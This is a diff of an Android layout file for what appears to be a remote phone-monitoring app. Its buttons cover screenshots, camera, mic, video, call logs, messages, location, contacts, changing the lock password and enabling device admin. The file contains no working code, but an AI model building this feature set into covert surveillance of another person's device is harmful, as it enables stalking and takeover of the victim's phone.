@@ -7,40 +7,67 @@
     android:scrollbars="vertical"
     tools:context=".MainActivity">
 
+
     <LinearLayout
         android:layout_width="match_parent"
-        android:layout_height="match_parent"
+        android:layout_height="wrap_content"
         android:orientation="vertical">
 
-        <Button
-            android:id="@+id/whatsappBtn"
-            android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-            android:text="WHATSAPP IMAGE" />
 
-        <Button
-            android:id="@+id/cameraBtn"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="CAMERA IMAGE" />
+        <!--<Button-->
+        <!--android:id="@+id/whatsappBtn"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="WHATSAPP IMAGE" />-->
 
-        <Button
-            android:id="@+id/screenshotBtn"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="SCREENSHOTS" />
+        <!--<Button-->
+        <!--android:id="@+id/cameraBtn"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="CAMERA IMAGE" />-->
 
-        <Button
-            android:id="@+id/downloadBtn"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="DOWNLOADS" />
+        <!--<Button-->
+        <!--android:id="@+id/screenshotBtn"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="SCREENSHOTS" />-->
 
-        <Button
-            android:id="@+id/notificationBtn"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="NOTIFICATIOSN" />
+        <!--<Button-->
+        <!--android:id="@+id/downloadBtn"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="DOWNLOADS" />-->
+
+        <!--<Button-->
+        <!--android:id="@+id/notificationBtn"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="NOTIFICATIOSN" />-->
+
+        <!--<Button-->
+        <!--android:id="@+id/callLogs"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="CALL LOGS" />-->
+
+        <!--<Button-->
+        <!--android:id="@+id/messages"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="MESSAGES" />-->
+
+        <!--<Button-->
+        <!--android:id="@+id/location"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="LOCATION" />-->
+
+
+        <!--<Button-->
+        <!--android:id="@+id/contacts"-->
+        <!--android:layout_width="match_parent"-->
+        <!--android:layout_height="wrap_content"-->
+        <!--android:text="CONTACTS" />-->
 
         <Button
             android:id="@+id/takeSS"
@@ -54,23 +81,6 @@
             android:layout_height="wrap_content"
             android:text="TAKE IMAGE" />
 
-        <Button
-            android:id="@+id/callLogs"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="CALL LOGS" />
-
-        <Button
-            android:id="@+id/messages"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="MESSAGES" />
-
-        <Button
-            android:id="@+id/location"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="LOCATION" />
 
         <Button
             android:id="@+id/mic"
@@ -78,11 +88,25 @@
             android:layout_height="wrap_content"
             android:text="MIC" />
 
+
         <Button
-            android:id="@+id/contacts"
+            android:id="@+id/takevideo"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="CONTACTS" />
+            android:text="TAKE VIDEO" />
+
+        <Button
+            android:id="@+id/changePass"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="CHANGE PASS" />
+
+        <Button
+            android:id="@+id/enableAdmin"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="ENABLE ADMIN" />
+
 
     </LinearLayout>
 </ScrollView>
